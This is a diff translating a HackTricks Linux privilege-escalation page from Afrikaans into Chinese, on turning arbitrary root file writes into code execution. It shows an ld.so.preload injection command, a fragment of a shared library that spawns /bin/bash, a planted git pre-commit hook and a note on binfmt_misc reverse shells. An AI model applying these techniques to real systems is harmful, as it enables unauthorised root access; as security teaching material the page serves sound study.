@@ -1,26 +1,26 @@
-# Willekeurige Lêer Skryf na Root
+# 任意文件写入根目录
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 ### /etc/ld.so.preload
 
-Hierdie lêer werk soos **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID-binêre lêers**.\
-As jy dit kan skep of wysig, kan jy net 'n **pad na 'n biblioteek wat gelaai sal word** by elke uitgevoerde binêre lêer, byvoeg.
+此文件的行为类似于 **`LD_PRELOAD`** 环境变量，但它也适用于 **SUID 二进制文件**。\
+如果您可以创建或修改它，您可以添加一个 **将在每个执行的二进制文件中加载的库的路径**。
 
-Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
+例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -35,11 +35,11 @@ system("/bin/bash");
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-### Git hakke
+### Git hooks
 
-[**Git hakke**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat uitgevoer word by verskeie **gebeure** in 'n git-opgaar soos wanneer 'n toewysing geskep word, 'n saamvoeging... Dus, as 'n **bevoorregte skrip of gebruiker** gereeld hierdie aksies uitvoer en dit moontlik is om in die `.git`-vouer te **skryf**, kan dit gebruik word vir **privilege-escalation**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是 **在 git 仓库中** 发生各种 **事件** 时 **运行的脚本**，例如当创建提交、合并时... 所以如果一个 **特权脚本或用户** 经常执行这些操作，并且可以 **在 `.git` 文件夹中写入**，这可以用于 **privesc**。
 
-Byvoorbeeld, Dit is moontlik om 'n skrip te **genereer** in 'n git-opgaar in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe toewysing geskep word:
+例如，可以在 git 仓库的 **`.git/hooks`** 中 **生成一个脚本**，以便在创建新提交时始终执行：
 
 {% code overflow="wrap" %}
 ```bash
@@ -48,29 +48,29 @@ chmod +x pre-commit
 ```
 {% endcode %}
 
-### Cron & Tyd lêers
+### Cron & Time files
 
 TODO
 
-### Diens & Soket lêers
+### Service & Socket files
 
 TODO
 
 ### binfmt\_misc
 
-Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binêre lêer watter tipe lêers moet uitvoer. TODO: kontroleer die vereistes om hierdie te misbruik om 'n omgekeerde dop uit te voer wanneer 'n algemene lêertipe oop is.
+位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪个二进制文件应该执行哪种类型的文件。TODO: 检查滥用此功能以在打开常见文件类型时执行反向 shell 的要求。
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
